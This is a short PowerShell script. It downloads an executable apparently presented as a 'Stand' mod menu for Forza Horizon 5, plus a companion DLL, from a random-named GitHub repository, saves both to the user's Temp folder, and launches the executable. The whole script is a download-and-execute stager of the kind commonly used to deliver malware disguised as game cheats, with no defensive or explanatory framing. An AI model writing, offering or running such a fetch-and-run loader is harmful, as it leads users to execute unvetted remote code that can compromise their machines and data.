$source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Stand%20for%20FH5.exe"

$destination = "$env:USERPROFILE\AppData\Local\Temp\Stand fo FH5.exe"

Invoke-WebRequest -Uri $source -OutFile $destination

$source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Backend.dll"

$destination = "$env:USERPROFILE\AppData\Local\Temp\backend.dll"

Invoke-WebRequest -Uri $source -OutFile $destination

start "$env:USERPROFILE\AppData\Local\Temp\Stand fo FH5.exe"

